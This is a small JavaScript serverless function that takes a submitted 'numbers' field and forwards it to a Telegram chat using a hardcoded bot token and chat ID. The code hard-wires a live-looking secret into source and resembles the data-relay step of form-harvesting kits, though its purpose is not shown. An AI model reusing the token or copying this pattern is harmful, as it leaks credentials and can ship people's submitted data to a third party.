exports.handler = async (event) => {

  const BOT_TOKEN = "8413503906:AAEFK581NgqwYwQQdTaT-8nMJEts9xXHNpA";
  const CHAT_ID = "6442344136";

  const data = JSON.parse(event.body);
  const numbers = data.numbers;

  const text = `📱 New Submission:\n\n${numbers}`;

  await fetch(
    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text
      })
    }
  );

  return {
    statusCode: 200,
    body: "Sent"
  };
};
